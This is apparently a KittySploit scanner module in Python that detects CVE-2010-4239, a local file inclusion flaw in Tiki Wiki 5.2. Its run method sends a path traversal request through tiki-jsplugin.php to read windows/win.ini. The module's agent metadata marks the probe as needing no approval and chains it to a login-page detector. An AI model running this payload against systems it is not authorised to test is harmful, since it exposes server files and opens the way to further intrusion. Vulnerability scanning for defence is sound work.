#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tiki Wiki CMS Groupware 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tiki Wiki CMS Groupware 5.2 - Local File Inclusion Detection',
        'description': 'Tiki Wiki CMS Groupware 5.2 is susceptible to a local file inclusion vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'tikiwiki', 'lfi', 'tiki', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://dl.packetstormsecurity.net/1009-exploits/tikiwiki52-lfi.txt',
            'https://www.openwall.com/lists/oss-security/2010/11/22/9',
            'https://security-tracker.debian.org/tracker/CVE-2010-4239',
            'https://nvd.nist.gov/vuln/detail/CVE-2010-4239',
            'https://access.redhat.com/security/cve/cve-2010-4239',
        ],
        'cve': 'CVE-2010-4239',
    }

    def run(self):
        r = self.http_request(method="GET", path='/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Tiki Wiki CMS Groupware 5.2 - Local File Inclusion detected",
                path='/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini',
            )
            return True
        return False

